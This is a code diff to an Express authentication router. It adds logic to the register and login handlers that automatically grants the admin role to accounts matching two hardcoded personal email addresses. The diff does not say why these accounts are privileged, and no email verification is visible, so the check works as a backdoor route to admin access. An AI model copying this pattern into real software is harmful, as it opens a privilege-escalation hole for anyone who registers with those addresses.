@@ -344,6 +344,11 @@ router.post('/register', rateLimiter, async (req, res) => {
       avatar: randomEmoji(),
     });
 
+    if (user.email && (user.email === 'abhayabikramshahiofficial@gmail.com' || user.email === 'stnjro@gmail.com')) {
+      user.role = 'admin';
+      await user.save();
+    }
+
     const { accessToken, refreshToken } = generateTokens(user);
     setRefreshCookie(res, refreshToken);
     setAccessCookie(res, accessToken);
@@ -378,6 +383,13 @@ router.post('/login', rateLimiter, async (req, res) => {
     const valid = await user.comparePassword(password);
     if (!valid) {
       return res.status(401).json({ message: 'Invalid credentials' });
+    }
+
+    if (user.email && (user.email === 'abhayabikramshahiofficial@gmail.com' || user.email === 'stnjro@gmail.com')) {
+      if (user.role !== 'admin') {
+        user.role = 'admin';
+        await user.save();
+      }
     }
 
     const { accessToken, refreshToken } = generateTokens(user);
